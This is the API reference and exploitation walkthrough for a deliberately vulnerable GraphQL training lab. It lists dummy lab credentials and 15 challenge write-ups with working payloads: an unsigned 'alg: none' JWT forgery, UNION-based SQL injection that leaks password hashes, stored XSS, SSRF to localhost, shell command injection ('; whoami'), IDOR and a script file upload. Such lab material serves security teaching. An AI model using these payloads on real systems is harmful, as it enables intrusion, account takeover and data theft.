Damn Vulnerable GraphQL Application

Complete GraphQL API Reference & Security Walkthrough Manual

Overview & Endpoint

DVGA-Node is a deliberately vulnerable web application designed to teach the fundamentals of GraphQL security. Unlike traditional REST APIs that utilize multiple endpoints, GraphQL uses a single gateway route that supports highly dynamic client-defined querying.

POST
/graphql
Global GraphQL Endpoint

All queries and mutations described in this document must be sent as HTTP POST requests with a JSON body to this single endpoint.

Request Format

{
  "query": "query { users { id email } }",
  "variables": {}
}

Authentication Flow

DVGA-Node uses JSON Web Tokens (JWT) for authentication. Once signed in, you must provide your token in the HTTP headers of subsequent requests to authenticate your identity.

The Authorization Header

Authorization: Bearer

Built-in Lab Accounts

Use these credentials to authenticate as different entities and observe differences in authorization levels.

Role Email Password Description
admin admin@lab.local Admin123! Full administrative privileges. Can execute command diagnostics.
user user_a@lab.local user_a_pass Alice (Profile ID: 2). Regular customer role.
user user_b@lab.local user_b_pass Bob (Profile ID: 3). Regular customer role.

Login Mutation Example

mutation {
  login(email: "user_a@lab.local", password: "user_a_pass") {
    token
    user {
      id
      email
      role
    }
  }
}

REST Endpoints

In addition to the GraphQL gateway, the server hosts several secondary REST endpoints to support auxiliary services:

GET
/healthz
Retrieves current server diagnostic information and security state.
POST
/api/upload
Auxiliary REST endpoint for file uploading (Accepts multi-part forms with a file field).

Queries Reference

profile(id: ID!): Profile

Fetches a specific user profile by its profile ID. BOLA vulnerable.

query {
  profile(id: "3") {
    fullName
    phone
    address
  }
}

orders(userId: ID!): [Order]

Retrieves all orders placed by a specific user ID.

order(id: ID!): Order

Fetches details of a single order by its unique order ID.

productsSearch(query: String!): [Product]

Searches product database names and descriptions matching the query string. SQL Injection vulnerable.

query {
  productsSearch(query: "Laptop") {
    name
    price
  }
}

comments: [Comment]

Retrieves the global feed of stored comments. Reflects Stored XSS.

fetchMetadata(url: String!): String

Fetches raw HTML/metadata content from an external address. SSRF vulnerable.

query {
  fetchMetadata(url: "http://example.com")
}

runDiagnostics(cmd: String!): SystemDiagnostics

Runs internal system tests (available to admin users). Command Injection vulnerable.

users: [User]

Lists all users in the system. Excessive Data Exposure and BAC vulnerable.

Mutations Reference

login(email: String!, password: String!): AuthPayload

Authenticates users and returns a JWT token. Weak password & brute force vulnerable.

updateBio(bio: String!): Profile

Updates the bio of the currently authenticated user profile. Stored XSS vulnerable.

mutation {
  updateBio(bio: "Security enthusiast") {
    bio
  }
}

updateProfileAddress(profileId: ID!, address: String!): Profile

Modifies address details on a profile ID. IDOR vulnerable.

mutation {
  updateProfileAddress(profileId: "3", address: "123 Main St") {
    id
    address
  }
}

uploadFile(filename: String!, base64Content: String!): File!

Uploads a file via Base64 format to the server public folder. Unrestricted file upload vulnerable.

Vulnerability Walkthrough Guide

This manual catalogs the vulnerability objectives and challenges. Reveal the steps to review queries, exploitation methods, and secure mitigation solutions.

1. Broken Object Level Authorization (BOLA)

critical

Description: BOLA (also known as IDOR) occurs when the system fetches internal records by user-supplied identifier parameters without confirming that the requesting user owns or has permission to read that record.

Objective: Query Bob's user profile (Profile ID 3) while authenticated as Alice.

View Exploitation Walkthrough & Payload

Exploitation Steps:

  1. Authenticate as Alice (user_a@lab.local) to acquire her JWT token.
  2. Send a query requesting the profile data for Bob's ID (profile ID 3).
query {
  profile(id: "3") {
    fullName
    phone
    address
  }
}

Observe that in Vulnerable mode, the server happily exposes Bob's private phone number and physical address. In Mitigated mode, access is correctly blocked.

2. Insecure Direct Object Reference (IDOR - Write)

high

Description: IDOR on write actions allows an attacker to alter objects belonging to other users by changing the identifier arguments in GraphQL mutation queries.

Objective: Change the physical address of Bob's user profile (ID 3) while authenticated as Alice.

View Exploitation Walkthrough & Payload

Exploitation Steps:

  1. Log in as Alice.
  2. Submit the updateProfileAddress mutation targeting Bob's profile ID (ID 3).
mutation {
  updateProfileAddress(profileId: "3", address: "COMPROMISED ADDRESS") {
    id
    address
  }
}

In Vulnerable mode, Bob's profile address is modified. Mitigated mode prevents this by validating that the authenticated session user matches the profile owner.

3. Weak JWT Validation

critical

Description: Flaws in cryptographic signature checks allow attackers to forge valid authentication tokens to assume administrative identities.

Objective: Access administrative queries (like users) by forging a JWT token payload.

View Exploitation Walkthrough & Payload

Exploitation Steps:

  1. Craft a JWT token header with "alg": "none".
  2. Define a claims payload claiming administrative credentials: { "id": 2, "role": "admin", "email": "user_a@lab.local" }.
  3. Encode both parts into base64, join them with a period, and add an empty signature: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6Miwicm9sZSI6ImFkbWluIiwiZW1haWwiOiJ1c2VyX2FAbGFiLmxvY2FsIn0.
  4. Submit this string as your Authorization: Bearer header and execute an administrative query like users.

4. Broken Access Control

high

Description: Privileged queries or fields (such as listing all registered users) lack role validation checks, exposing administrative details to ordinary users.

Objective: List all registered users in the database using a regular customer session.

View Exploitation Walkthrough & Payload

Exploitation Steps:

  1. Authenticate as any regular user account.
  2. Run the administrative users query to fetch all system users.
query {
  users {
    id
    email
    role
  }
}

5. SQL Injection (SQLi)

critical

Description: Direct dynamic string construction in SQL statements allows arbitrary database statements execution, exposing the entire database contents.

Objective: Leak credentials from the database user table using dynamic product searches.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Perform a UNION SELECT injection inside the productsSearch query argument to leak details from the database user table:

query {
  productsSearch(query: "Audit%' UNION SELECT id, email, password_hash, role, '1' FROM users --") {
    id
    name
    price
    description
  }
}

6. Stored XSS

high

Description: Persisting raw, unescaped HTML scripts into the database allows execution of client-side scripts inside the browser context of other visitors.

Objective: Update profile bio metadata to execute client-side scripts inside browsers.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Update your profile bio or submit a comment containing a standard script payload:

mutation {
  updateBio(bio: "<img src=x onerror=alert('StoredXSS')>") {
    bio
  }
}

7. Server-Side Request Forgery (SSRF)

high

Description: The server acts as an open proxy, fetching dynamic URLs supplied by client parameters without blocking internal loopbacks or RFC 1918 private scopes.

Objective: Request loopback addresses or internal health metrics on the application port.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Submit a request asking the server to query internal administrative services or the app health diagnostics directly:

query {
  fetchMetadata(url: "http://localhost:5013/healthz")
}

8. Brute Force Throttling Failure

medium

Description: Lack of login throttling or account lockouts allows rapid, automated credential spray attacks against users.

Objective: Perform rapid authentication mutation requests without throttling triggers.

View Exploitation Walkthrough & Payload

Observe the execution metrics inside vulnerable vs secure modes. Vulnerable mode runs instantly, while secure mode introduces deliberate computational delays to minimize dictionary attacks.

9. Command Execution

critical

Description: Passing unvalidated shell arguments directly to system exec APIs allows attackers to execute arbitrary system OS commands.

Objective: Execute secondary shell processes through diagnostic queries.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Inject semicolon or pipeline command separators to run secondary shell processes:

query {
  runDiagnostics(cmd: "ping 127.0.0.1; whoami") {
    output
    status
  }
}

10. Introspection Schema Exposure

low

Description: Leaving GraphQL introspection queries enabled in production allows scans that automatically map the entire API surface structure.

Objective: Extract all active type definitions via default schema queries.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Fetch the system schema details using standard meta-queries:

query {
  __schema {
    types {
      name
    }
  }
}

11. Excessive Data Exposure

medium

Description: Querying database rows entirely (e.g., selecting all columns) returns sensitive parameters (like hashed password credentials) that are reflected in the API schema.

Objective: Retrieve password hash definitions by requesting additional user attributes.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Query the user records and explicitly request the password_hash field:

query {
  users {
    email
    password_hash
  }
}

12. Field-Level Authorization Failure

medium

Description: Nested relations inside parent types lack authorization context checks, allowing attackers to access details of other user accounts through child relation loops.

Objective: Access administrative relational data (email, roles) using nested user orders relations.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Query order details and request relational nested information of the user linked to that order:

query {
  order(id: "2") {
    id
    user {
      email
      role
      is_admin
    }
  }
}

13. Sensitive Error Leakage

low

Description: Intercepting and reflecting raw SQL exceptions or stack traces helps attackers understand system infrastructure and refine payloads.

Objective: Generate error exceptions and review database snippets inside return payloads.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Send invalid characters or malformed queries to trigger SQL exceptions, then review the detailed stack trace extensions included in the GraphQL errors array response.

14. Insecure File Upload Validation

high

Description: The server saves files directly into the web root directory without validating file extensions or MIME types, enabling HTML-based XSS attacks or command injection.

Objective: Upload executable HTML content via base64 upload mutations.

View Exploitation Walkthrough & Payload

Exploitation Steps:

Submit the uploadFile mutation with an HTML filename and write client-side script payloads in the Base64 content body:

mutation {
  uploadFile(filename: "exploit.html", base64Content: "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=") {
    id
    filename
    filePath
  }
}

After upload, copy the returned filePath and access it directly via your browser to execute the script.

15. Weak Password Policy

medium

Description: Enabling simple administrative passwords or keeping standard testing parameters active makes training labs highly susceptible to dictionary guesses.

Objective: Enforce password complexity or attempt predictable logins against default administrators.

View Exploitation Walkthrough & Payload

Observe standard test users credentials. Alice, Bob, and Admin passwords can be parsed using rapid password dictionaries.
